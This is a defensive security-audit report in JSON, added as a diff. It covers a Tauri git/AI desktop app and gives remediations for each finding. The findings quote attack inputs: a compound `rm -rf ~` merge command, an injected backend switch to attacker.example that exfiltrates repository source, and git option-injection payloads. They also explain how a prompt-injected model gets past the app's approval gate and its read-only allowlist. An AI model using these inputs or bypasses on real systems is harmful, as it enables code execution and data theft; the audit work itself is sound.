@@ -1,0 +1,114 @@
+{
+  "findings": [
+    {
+      "id": "DAST-001",
+      "severity": "critical",
+      "title": "Content-Security-Policy is null — any DOM XSS becomes full IPC/RCE",
+      "file": "src-tauri/tauri.conf.json",
+      "line": 23,
+      "snippet": "\"security\": {\n  \"csp\": null\n}",
+      "description": "For a Tauri app the CSP is the single most important security control. With `app.security.csp` set to `null`, the webview enforces NO content-security policy: any injected/remote script executes with full privileges and can reach every registered `#[tauri::command]` via `window.__TAURI__`/`invoke`. The frontend renders attacker-influenceable, network-sourced data everywhere — PR/issue titles & bodies, CI check names, commit messages/diffs (from `gh`/`git` on a *cloned* repo), Ollama model names, AI/chat output, and Markdown files in the repo. Any one of these becoming a script-execution sink (a future `dangerouslySetInnerHTML`, a vulnerable transitive dep, an SVG/HTML injection, a react-markdown plugin change) is no longer a contained UI bug: it is a direct pivot to the entire dangerous IPC surface below (arbitrary `git`/`gh`/`claude`/`code`/`cmd` subprocess execution, arbitrary-path file read/write, history rewrite, push, PR creation). A null CSP turns 'stored XSS from a malicious repo I cloned' into remote code execution on the developer's machine. This is the root multiplier for nearly every other finding in this report.",
+      "remediation": "Set a strict CSP in tauri.conf.json, e.g. `\"csp\": \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\"`. Drop `'unsafe-inline'`/`'unsafe-eval'` for scripts. Tighten until the app still loads, then keep it. Pair with `dangerousDisableAssetCspModification: false` (default) so Tauri keeps injecting nonce/hashes."
+    },
+    {
+      "id": "DAST-002",
+      "severity": "high",
+      "title": "Compound-command approval grants every sub-command (incl. rm) a persistent allowlist",
+      "file": "src/components/ChatDock.tsx",
+      "line": 65,
+      "snippet": "for (const part of cmd.split(/&&|\\|\\||;|\\|/)) { ... pats.add(`Bash(${prefix.join(\" \")}:*)`) }  // then approve() pushes ALL patterns into approvedRef (persists across turns)",
+      "description": "The chat 'merge' flow runs claude with only READONLY_TOOLS; a write is denied, surfaced in `permission_denials`, and the UI asks the user to approve. `toolPatterns()` derives one `--allowedTools` prefix per sub-command of a compound command. Verified behaviour: input `gh pr merge 7 --squash && rm -rf ~` yields `[\"Bash(gh pr merge:*)\", \"Bash(rm:*)\"]`. The approval modal shows the *full* command string (so a user skimming for 'gh pr merge' may click Autoriser), but `approve()` then pushes ALL derived patterns — including `Bash(rm:*)` — into `approvedRef`, which is passed as `extra_allowed` on EVERY subsequent `chat_send`. Result: (a) approving one compound merge silently whitelists `rm` (and any other tacked-on verb) for the rest of the session; (b) on later turns the model can run `rm -rf ...` / `git push --force` / etc. with NO further prompt, because the prefix patterns are coarse (`Bash(git merge:*)` also permits `git merge --no-verify`; `Bash(git push:*)` permits force-push — confirmed). A malicious instruction reaching the model (prompt injection from PR/commit/diff text it is asked to review, or via XSS calling chat_send) can thus escalate from a single innocuous-looking approval to arbitrary command execution.",
+      "remediation": "Derive a pattern ONLY for the exact sub-command the user is being asked about, and refuse to auto-approve compound commands: if `cmd` contains `&&`, `||`, `;`, `|`, or a newline, show each sub-command separately and require per-part approval, or reject and ask the model to issue one command at a time. Never add a pattern the user did not see described 1:1. Scope approvals to a single turn (clear `approvedRef` after the approved command runs) instead of persisting for the whole session. Consider allow-listing exact argument vectors rather than `verb:*` prefixes for destructive verbs."
+    },
+    {
+      "id": "DAST-003",
+      "severity": "high",
+      "title": "Dangerous IPC commands run arbitrary subprocesses / write files with no frontend-trust boundary",
+      "file": "src-tauri/src/lib.rs",
+      "line": 30,
+      "snippet": "invoke_handler(tauri::generate_handler![ commands::open_in_vscode, commands::clone_repo, commands::create_markdown, term::term_open_*, chat::chat_open_* , ... ])",
+      "description": "Every `#[tauri::command]` is an endpoint callable by ANY script running in the webview (the IDOR/priv-esc equivalent for a desktop app). Combined with the null CSP (DAST-001), injected JS can invoke all of them directly. The most dangerous: `open_in_vscode` (Windows: spawns `cmd /c code <repo>`), `clone_repo` (runs `git clone <attacker URL>` into an attacker-chosen `dest_parent` — a malicious URL such as `ext::sh -c ...` or a path with a transport helper can be abused, and it writes to an arbitrary existing directory), `create_markdown`/`apply_conflict_resolution` (write file content the caller fully controls into the repo, then `git add`+`commit`), the `term_open_*`/`chat_open_*` family (spawn the real `claude` CLI — in the terminal path WITHOUT the chat approval gate — pre-seeded with attacker-chosen prompts, and the user can be socially-engineered or the model prompt-injected into running writes), plus `submit`/`publish_branch`/`restack`/`reword_commit`/`drop_commit`/`split_commit`/`cherry_pick` which rewrite history and force-push to `origin`. No command authenticates the caller or distinguishes a user click from a programmatic `invoke`; the only gate is the (bypassable) chat approval modal for chat-mode writes.",
+      "remediation": "Treat the webview as untrusted. (1) Fix DAST-001 first. (2) Move genuinely dangerous primitives behind explicit, user-initiated confirmation in Rust (a native dialog the frontend cannot auto-confirm) rather than a webview modal. (3) Validate/whitelist arguments server-side (e.g. `open_in_vscode` should not shell through `cmd`; spawn `code` directly; `clone_repo` should reject non-http(s)/ssh URLs and refuse transport-helper schemes). (4) Consider splitting capabilities so destructive commands require a separate, narrowly-scoped capability."
+    },
+    {
+      "id": "DAST-004",
+      "severity": "high",
+      "title": "Ollama host is fully user-configurable to any remote address over plaintext HTTP (SSRF / data exfiltration / MITM)",
+      "file": "src-tauri/src/assist/mod.rs",
+      "line": 130,
+      "snippet": "AiBackend::Ollama => { vec![(\"ANTHROPIC_BASE_URL\", host), (\"ANTHROPIC_AUTH_TOKEN\", \"ollama\"), ...] }  // host = cfg.ollama_host, set from frontend via set_ai_backend",
+      "description": "`set_ai_backend` (callable from the webview) stores an arbitrary `ollama_host` string into the process-global AiConfig. That host is used two ways with no validation, no allow-list, and no TLS requirement: (1) `ollama_models()` issues `GET <host>/api/tags` via a `ureq` client built with `default-features=false` (TLS disabled, see Cargo.toml line 34) — so it speaks cleartext HTTP only and will MITM trivially on a hostile network; the host can be any internal address, making this a classic SSRF probe primitive (the response/error text is returned to the UI, enabling internal port/service enumeration). (2) In Ollama mode the host is injected as `ANTHROPIC_BASE_URL` into every spawned `claude` process — meaning the FULL prompt context (repo diffs, PR contents, commit code, conflict file contents) is sent to whatever host an attacker (or a tricked user) configured, in plaintext, with a static `ANTHROPIC_AUTH_TOKEN=ollama`. Injected frontend JS could silently call `set_ai_backend('ollama','http://attacker.example/', 'x','')` and then every AI review/chat ships the repository's source to the attacker.",
+      "remediation": "Constrain the Ollama host: default to and validate against loopback (`127.0.0.1`/`localhost`/`[::1]`) unless the user explicitly opts into a remote host behind a clear warning. If remote hosts are supported, require `https://` and enable TLS in the ureq client (`ureq` with the `tls` feature) and verify certs. Surface the active backend/host prominently in the UI so silent reconfiguration is visible. Do not inject an unvalidated host into child-process env."
+    },
+    {
+      "id": "DAST-005",
+      "severity": "medium",
+      "title": "READONLY_TOOLS pre-allowlist is broader than 'read-only' (git log/show/diff can execute via pager/external commands)",
+      "file": "src-tauri/src/assist/mod.rs",
+      "line": 484,
+      "snippet": "const READONLY_TOOLS: [&str;11] = [\"Bash(git show:*)\",\"Bash(git log:*)\",\"Bash(git diff:*)\",\"Bash(git status:*)\",\"Bash(gh pr view:*)\",\"Bash(gh pr diff:*)\",\"Bash(gh pr checks:*)\",\"Bash(gh pr list:*)\",\"Read\",\"Grep\",\"Glob\"]",
+      "description": "These tools are pre-approved (no prompt) for ALL three AI funnels — including the headless one-shots and the chat. The `:*` wildcard allows arbitrary arguments to each verb, and several of these git/gh subcommands are not purely read-only in practice: `git log`/`git diff`/`git show` honour repo-local config and can be steered to run external programs (e.g. `-c core.pager=<cmd>`, `-c diff.external=<cmd>`, `--ext-diff`, `-O<file>`, textconv/`GIT_EXTERNAL_DIFF` driven by `.gitattributes`), and they accept `--output=<path>` to write files. Because the working repo can be a malicious clone, a prompt-injected model (or the model 'helpfully' exploring) operating only within the supposedly-safe allowlist could achieve command execution or file write WITHOUT ever tripping the approval modal. The 'read-only' guarantee the architecture relies on is therefore not airtight.",
+      "remediation": "Do not whitelist with bare `verb:*`. Either run these via a hardened wrapper that strips dangerous options (`-c`, `--output`, `-O`, `--ext-diff`, `--open-files-in-pager`) and sets a safe environment (`GIT_PAGER=cat`, `GIT_EXTERNAL_DIFF=` empty, `core.pager=cat`, `-c protocol.ext.allow=never`), or constrain the allowed argument shapes. Audit each gh subcommand similarly. Treat the analysed repo as untrusted input to git."
+    },
+    {
+      "id": "DAST-006",
+      "severity": "medium",
+      "title": "opener:default grants unscoped open_url — any URL scheme openable, no http/https restriction",
+      "file": "src-tauri/capabilities/default.json",
+      "line": 8,
+      "snippet": "\"permissions\": [ \"core:default\", \"opener:default\", \"dialog:default\", \"notification:default\" ]",
+      "description": "The resolved `opener:default` permission set is `[allow-open-url, allow-reveal-item-in-dir, allow-default-urls]` (from gen/schemas/acl-manifests.json). `allow-default-urls` would scope opening to `http(s)`/`mailto`/`tel`, but `allow-open-url` is described as 'Enables the open_url command WITHOUT any pre-configured scope' — its presence makes `open_url` callable for arbitrary URLs/schemes, widening the intended scope. The frontend already opens backend-derived URLs without local validation: `openUrl(branch.pr.url)`, `openUrl(issue.url)`, `openUrl(c.link)` (PrPage/BranchDetail/IssueDetailPanel) — these strings come straight from `gh` JSON for a *cloned* repo, so a malicious repo can supply a hostile URL that the user opens with a click. With the unscoped permission, injected JS could also call the opener IPC directly with `file:`/other schemes. Reveal-item-in-dir is likewise unscoped (arbitrary path passed to the OS file explorer).",
+      "remediation": "Drop `opener:default` and grant only the narrowly scoped permission you need: include `allow-default-urls` (and a custom scope limited to `https://github.com/*` if possible) but NOT the unscoped `allow-open-url`/`allow-reveal-item-in-dir`. Validate URLs in the frontend before calling `openUrl` (require `https:` and an expected host). Treat any URL sourced from `gh`/`git` as untrusted."
+    },
+    {
+      "id": "DAST-007",
+      "severity": "medium",
+      "title": "Several IPC commands pass attacker-controlled refs to git as positional args with no `--` end-of-options guard (argument injection)",
+      "file": "src-tauri/src/commands.rs",
+      "line": 1046,
+      "snippet": "let result = git::git(repo, &[\"cherry-pick\", &sha]);  // sha is the raw frontend string; also commit_detail/analyze_commit/split_diff -> `git show <sha>`, checkout <branch>, etc.",
+      "description": "Commands like `cherry_pick(sha,target)`, `commit_detail(sha)`, `analyze_commit(sha)`, `review_commit(sha)`, `split_diff(sha)`, `branch_commits(branch)` and `checkout(branch)` forward the raw frontend-supplied string directly into a git argv as a positional argument WITHOUT a preceding `--` separator. git/gh treat a leading-dash value as an option, so a value like `--upload-pack=...`, `--output=<path>`, `-c<config>` (or for `cherry-pick`, options that change behaviour) can be smuggled in where a ref is expected. Reachable because the webview controls these arguments (null CSP → injected `invoke`). Several of these feed subcommands (`git show`, `git log`, `git diff`) that, as noted in DAST-005, can be steered to execute external programs or write files via options. Note: `valid_stash_ref` (stashes), `safe_rel` (markdown), and the cycle/branch-name checks DO validate their inputs — but the ref/sha-taking commands above do not.",
+      "remediation": "Insert a literal `--` before user-controlled positional refs in every git/gh invocation (e.g. `[\"cherry-pick\", \"--\", sha]`, `[\"show\", ..., \"--\", sha]`, `[\"checkout\", \"--\", branch]` where supported), and/or validate that the value is a real object via `git rev-parse --verify --end-of-options <v>` before use (as `resolve_on_branch` partially does for commit-editing). Reject values beginning with `-`."
+    },
+    {
+      "id": "DAST-008",
+      "severity": "medium",
+      "title": "Process-global AI config + chat session map: no isolation / rate limiting on destructive ops triggered by injected frontend code",
+      "file": "src-tauri/src/assist/mod.rs",
+      "line": 89,
+      "snippet": "pub(crate) fn ai_config() -> &'static Mutex<AiConfig> { static CFG: OnceLock<Mutex<AiConfig>> ... }",
+      "description": "The AI backend selection is a single process-global mutated by `set_ai_backend` with no provenance check, so the last `invoke` wins for every subsequent AI spawn across all windows/sessions (enables the silent-exfil setup in DAST-004). More broadly, NOTHING throttles or rate-limits sensitive operations: injected frontend code (post-XSS) can call `submit`/`publish_branch` in a loop to force-push every branch, spam PR creation against GitHub, fire repeated `clone_repo`/`open_in_vscode` to spawn processes, or open many `term_open_*` PTYs running `claude`. There is no per-command rate limit, debounce, or 'are you sure' for bulk/destructive actions on the Rust side; the UI is the only brake and it is bypassable. (Noted as medium because impact depends on DAST-001/003; on a local single-user app the realistic trigger is XSS or model prompt-injection rather than an external attacker.)",
+      "remediation": "Add server-side guards for destructive/expensive commands: simple rate limiting / coalescing, and a native confirmation for bulk push/PR operations. Validate that `set_ai_backend` reconfiguration is user-initiated and reflect the active backend in the UI. Consider per-window state instead of a process-global where feasible."
+    },
+    {
+      "id": "DAST-009",
+      "severity": "low",
+      "title": "GIT_TERMINAL_PROMPT not set on most git invocations — credential/transport prompts can hang or leak via crafted URLs",
+      "file": "src-tauri/src/git/mod.rs",
+      "line": 7,
+      "snippet": "pub fn git(repo: &Path, args: &[&str]) -> Result<String> { let r = proc::run(\"git\", args.iter().copied(), Some(repo))?; ... }",
+      "description": "Only `clone_repo` sets `GIT_TERMINAL_PROMPT=0`. The generic `git()` wrapper (used by `push`/`fetch`/`fast_forward` and everything else) does not, nor does it disable credential helpers or constrain transports. A network-touching op against a crafted remote/refspec (reachable via `publish_branch`/`submit`/`sync` with attacker-influenced branch/remote config in a cloned repo) could block on a credential prompt (the captured subprocess has no interactive stdin → the call hangs), or interact with an unexpected transport helper. Lower severity since the trigger requires a hostile repo configuration and the commands already gate on a clean tree, but it is a hardening gap.",
+      "remediation": "Set `GIT_TERMINAL_PROMPT=0` (and consider `GIT_ASKPASS=true`, `-c credential.helper=`, `-c protocol.ext.allow=never`, `-c protocol.file.allow=user`) uniformly in the central `proc::run`/`git()` wrapper for all git invocations, not just clone."
+    },
+    {
+      "id": "DAST-010",
+      "severity": "info",
+      "title": "Markdown rendering is currently safe (react-markdown v10, no rehype-raw) — keep it that way",
+      "file": "src/components/DocsView.tsx",
+      "line": 211,
+      "snippet": "<Markdown>{content}</Markdown>  // react-markdown ^10, no rehype-raw / skipHtml off by default",
+      "description": "Positive finding / watch item. The three Markdown sinks (DocsView, ChatDock, DigestBanner) use react-markdown v10 with no `rehype-raw` plugin and no `dangerouslySetInnerHTML`, so raw HTML/script embedded in repo Markdown, AI output, or chat text is NOT executed (react-markdown escapes HTML by default). This is the main reason the null-CSP (DAST-001) has not already produced a trivial repo->RCE chain. However it is one dependency/config change away from disaster: adding `rehype-raw`, switching renderers, or a react-markdown regression would instantly turn malicious repo Markdown / model output into stored XSS, which the null CSP converts to full IPC/RCE. Custom link rendering also currently relies on the (overly broad) opener permission (DAST-006).",
+      "remediation": "Document and enforce 'no rehype-raw / no dangerouslySetInnerHTML' as an invariant (lint rule or test). Fix the CSP (DAST-001) so this layer is defence-in-depth rather than the sole barrier. Sanitize/validate link hrefs in a custom `a` component (allow only http/https)."
+    },
+    {
+      "id": "DAST-011",
+      "severity": "info",
+      "title": "Classic web auth / session / CORS / security headers are N/A for this local desktop app; no localhost server in production",
+      "file": "src-tauri/tauri.conf.json",
+      "line": 6,
+      "snippet": "\"build\": { \"devUrl\": \"http://localhost:1420\", \"frontendDist\": \"../dist\" }",
+      "description": "Informational, for completeness against the standard DAST checklist. There is no authentication layer, no cookies/sessions, no CORS policy, and no HTTP security headers to audit because the app ships a bundled local frontend (`frontendDist`) loaded via Tauri's custom protocol, not a web server. The `http://localhost:1420` Vite dev server exists only during `npm run tauri dev` and is not part of the shipped product. `dangerousRemoteDomainIpcAccess` is not configured (good — IPC is not exposed to remote origins), and `withGlobalTauri` is not enabled in the config. The real attack surface is the IPC/CSP/capabilities/subprocess model captured in DAST-001..009, not web-tier controls.",
+      "remediation": "No action for the web-auth items. Keep `dangerousRemoteDomainIpcAccess` unset and do not enable `withGlobalTauri` unless required. Ensure the dev server is never bundled into release builds (it isn't, by default)."
+    }
+  ]
+}
